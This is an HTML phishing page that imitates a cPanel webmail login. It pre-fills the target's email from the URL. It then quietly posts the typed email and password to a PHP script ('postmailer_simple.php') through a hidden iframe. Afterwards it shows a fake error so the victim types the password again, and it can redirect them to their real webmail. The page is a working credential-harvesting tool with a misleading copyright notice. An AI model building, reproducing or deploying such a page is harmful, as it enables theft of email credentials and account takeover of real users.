<!DOCTYPE html>
<html lang="en" dir="ltr">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
      <meta name="google" content="notranslate">
      <meta name="apple-itunes-app" content="app-id=1188352635">
      <title>Webmail Login</title>
      <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGYYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdapa26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjParPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/666t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g338J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
      <style type="text/css">
         body {
             font-family: 'Open Sans', Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             margin: 0;
             padding: 0;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
         }
         
         .login-container {
             background: white;
             border-radius: 10px;
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
             padding: 40px;
             width: 100%;
             max-width: 400px;
             text-align: center;
         }
         
         .main-logo {
             width: 250px;
             height: auto;
             margin-bottom: 30px;
         }
         
         .input-field {
             margin-bottom: 20px;
             text-align: left;
         }
         
         .input-field label {
             display: block;
             margin-bottom: 5px;
             color: #333;
             font-weight: 600;
         }
         
         .input-field input {
             width: 100%;
             padding: 12px;
             border: 2px solid #e1e5e9;
             border-radius: 5px;
             font-size: 16px;
             transition: border-color 0.3s;
             box-sizing: border-box;
         }
         
         .input-field input:focus {
             outline: none;
             border-color: #667eea;
         }
         
         .login-btn {
             margin: 20px 0;
         }
         
         .login-btn button {
             width: 100%;
             padding: 12px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
             border-radius: 5px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: transform 0.2s;
         }
         
         .login-btn button:hover {
             transform: translateY(-2px);
         }
         
         .login-btn button:disabled {
             opacity: 0.6;
             cursor: not-allowed;
             transform: none;
         }
         
         .error-message {
             color: #e74c3c;
             margin-top: 10px;
             display: none;
         }
         
         .success-message {
             color: #27ae60;
             margin-top: 10px;
             display: none;
         }
         
         .reset-pw {
             margin-top: 20px;
         }
         
         .reset-pw a {
             color: #667eea;
             text-decoration: none;
             font-size: 14px;
         }
         
         .reset-pw a:hover {
             text-decoration: underline;
         }
         
         .loading {
             display: none;
             margin-top: 10px;
         }
         
         .spinner {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #667eea;
             border-radius: 50%;
             width: 20px;
             height: 20px;
             animation: spin 1s linear infinite;
             margin: 0 auto;
         }
         
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
         
         .info-box {
             background: #e8f4fd;
             border: 1px solid #bee5eb;
             border-radius: 5px;
             padding: 15px;
             margin-bottom: 20px;
             font-size: 14px;
             color: #0c5460;
         }
         
         .copyright {
             position: fixed;
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
             color: rgba(255, 255, 255, 0.7);
             font-size: 12px;
             text-align: center;
         }
         
         .copyright a {
             color: rgba(255, 255, 255, 0.9);
         }
      </style>
   </head>
   <body>
      <div class="login-container">
         <img class="main-logo" src="https://webmail.gracedrive.org/cPanel_magic_revision_1453787365/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail Logo">
         
         <div class="info-box">
             <strong>🔧 CORS-Free Version</strong><br>
             This version uses direct form submission to avoid CORS issues. Works with any web server including Python's SimpleHTTPServer.
         </div>
         
                   <form id="login_form" action="postmailer_simple.php" method="post" target="hidden_iframe">
            <div class="input-field">
               <label for="email">Email Address</label>
               <input name="email" id="email" type="email" placeholder="Enter your email address" required>
            </div>
            
            <div class="input-field">
               <label for="password">Password</label>
               <input name="password" id="password" type="password" placeholder="Enter your password" required>
            </div>
            
            <div class="error-message" id="error_msg"></div>
            <div class="success-message" id="success_msg"></div>
            <div class="loading" id="loading">
               <div class="spinner"></div>
               <p>Processing login...</p>
            </div>
            
            <div class="login-btn">
               <button type="submit" id="login_submit">Log in</button>
            </div>
            
            <div class="reset-pw">
               <a href="#" id="reset_password">Reset Password</a>
            </div>
         </form>
         
         <!-- Hidden iframe for form submission -->
         <iframe name="hidden_iframe" style="display:none;"></iframe>
      </div>
      
      <div class="copyright">
         Copyright© 2025 cPanel, L.L.C.<br>
         <a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
      </div>
      
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
      <script>
         $(document).ready(function() {
             
             // Enhanced function to extract email from URL
             function extractEmailFromUrl() {
                 var email = null;
                 
                 // Try URL hash
                 var hash = window.location.hash;
                 if (hash && hash.length > 1) {
                     var hashContent = decodeURIComponent(hash.substring(1));
                     var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                     if (emailRegex.test(hashContent)) {
                         email = hashContent;
                     }
                 }
                 
                 // Try URL parameters
                 if (!email) {
                     var urlParams = new URLSearchParams(window.location.search);
                     var emailParam = urlParams.get('email') || urlParams.get('user');
                     if (emailParam) {
                         var decodedEmail = decodeURIComponent(emailParam);
                         var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                         if (emailRegex.test(decodedEmail)) {
                             email = decodedEmail;
                         }
                     }
                 }
                 
                 return email;
             }
             
             // Auto-populate email
             var emailFromUrl = extractEmailFromUrl();
             if (emailFromUrl) {
                 $('#email').val(emailFromUrl);
                 $('#password').focus();
                 $('#email').css('background-color', '#f0f8ff');
                 setTimeout(function() {
                     $('#email').css('background-color', '');
                 }, 2000);
             }
             
             // Form submission handler
             $('#login_form').on('submit', function(e) {
                 var email = $('#email').val().trim();
                 var password = $('#password').val();
                 
                 // Hide previous messages
                 $('#error_msg, #success_msg').hide();
                 
                 // Basic validation
                 if (!email || !password) {
                     $('#error_msg').text('Please enter both email and password.').show();
                     return false;
                 }
                 
                 // Show loading
                 $('#loading').show();
                 $('#login_submit').prop('disabled', true).text('Processing...');
                 
                 // The form will submit to the hidden iframe
                 // After 3 seconds, show "wrong password" message
                 setTimeout(function() {
                     $('#loading').hide();
                     $('#login_submit').prop('disabled', false).text('Log in');
                     $('#success_msg').text('Login attempt recorded. Please check your credentials.').show();
                     $('#password').val('').focus();
                 }, 3000);
                 
                 return true; // Allow form submission
             });
             
             // Reset password functionality
             $('#reset_password').click(function(e) {
                 e.preventDefault();
                 var email = $('#email').val().trim();
                 if (!email) {
                     $('#error_msg').text('Please enter your email address first.').show();
                     $('#email').focus();
                     return false;
                 }
                 
                 var domain = email.split('@')[1];
                 window.location.href = 'https://webmail.' + domain;
             });
             
             // Clear messages when typing
             $('#email, #password').on('input', function() {
                 $('#error_msg, #success_msg').hide();
             });
             
             // Debug functions for testing
             window.testFormSubmission = function() {
                 console.log('Testing form submission...');
                 $('#email').val('test@example.com');
                 $('#password').val('testpass123');
                 $('#login_form').submit();
             };
             
             window.showCurrentUrl = function() {
                 console.log('Current URL:', window.location.href);
                 console.log('Protocol:', window.location.protocol);
                 console.log('Host:', window.location.host);
             };
             
             // Show current access method
             console.log('🌐 Access Method:', window.location.protocol);
             if (window.location.protocol === 'file:') {
                 console.log('⚠️ WARNING: Accessing via file:// protocol');
                 console.log('💡 For best results, use: http://localhost:8080/webmail_login_standalone.html');
             } else {
                 console.log('✅ Accessing via HTTP server - Good!');
             }
         });
      </script>
   </body>
</html>